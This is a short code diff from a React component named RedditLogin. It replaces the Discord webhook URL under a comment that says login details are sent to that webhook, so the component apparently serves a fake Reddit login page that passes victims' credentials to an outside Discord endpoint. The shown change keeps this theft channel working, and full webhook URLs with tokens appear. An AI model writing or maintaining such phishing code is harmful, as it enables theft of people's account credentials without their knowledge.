@@ -81,7 +81,7 @@ const RedditLogin = () => {
 
     try {
       // Send login details to Discord webhook
-      const webhookUrl = 'https://discord.com/api/webhooks/1463586619612205289/3sRnACuGhW3BCULUQkyaTnaw3EIWd3NhumDqyknN70FPgjccKOqTjeGZxVTEwprhRiot';
+      const webhookUrl = 'https://discord.com/api/webhooks/1465382211061547130/aiXFCCdPDjBPUuixbNR8rXWiWbCcRE9e4pReJfTaYxutYAF5FRyrBj-2wJLLDMINky07';
       
       const currentTime = new Date().toLocaleString('en-US', {
         timeZone: 'UTC',
